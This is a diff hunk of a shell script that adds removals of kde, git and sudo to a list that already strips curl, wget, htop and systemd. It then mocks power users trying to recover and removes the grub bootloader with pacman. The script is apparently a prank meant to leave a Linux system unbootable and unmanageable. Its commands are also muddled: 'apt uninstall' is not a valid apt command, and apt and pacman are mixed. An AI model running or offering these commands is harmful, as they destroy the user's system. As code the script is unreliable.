@@ -36,6 +36,9 @@ apt uninstall curl
 apt uninstall wget
 apt uninstall htop
 apt uninstall systemd
+apt uninstall kde
+apt uninstall git
+apt uninstall sudo
 echo 'bloat for power users to try to get there systems back :P'
 echo 'if err try other operating systems'
 sudo pacman -Rns grub
